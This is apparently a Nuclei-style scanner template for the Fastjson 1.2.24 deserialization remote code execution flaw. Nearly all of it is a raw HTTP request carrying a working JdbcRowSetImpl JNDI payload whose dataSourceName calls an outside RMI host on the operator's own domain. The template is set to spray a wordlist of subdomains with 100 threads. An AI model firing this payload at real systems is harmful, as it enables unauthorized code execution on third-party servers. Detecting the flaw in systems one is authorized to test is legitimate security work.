id: fastjson-1.2.24-rce 1
info:
  author: zh
  name: Fastjson 1.2.24 Deserialization RCE
  reference:
  - https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce
  - https://www.freebuf.com/vuls/208339.html
  - https://github.com/wyzxxz/fastjson_rce_tool
  severity: critical
  tags: fastjson,rce,deserialization,oast
requests:
- attack: sniper
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - "POST / HTTP/1.1\nHost: {{Subdomains}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
    \ rv:68.0) Gecko/20100101 Firefox/68.0\nAccept-Encoding: gzip, deflate\nAccept:\
    \ */*\nContent-Type: application/json\n\n{\n    \"b\":{\n        \"@type\":\"\
    com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/Exploit\"\
    ,\n        \"autoCommit\":true\n    }\n}"
  threads: 100
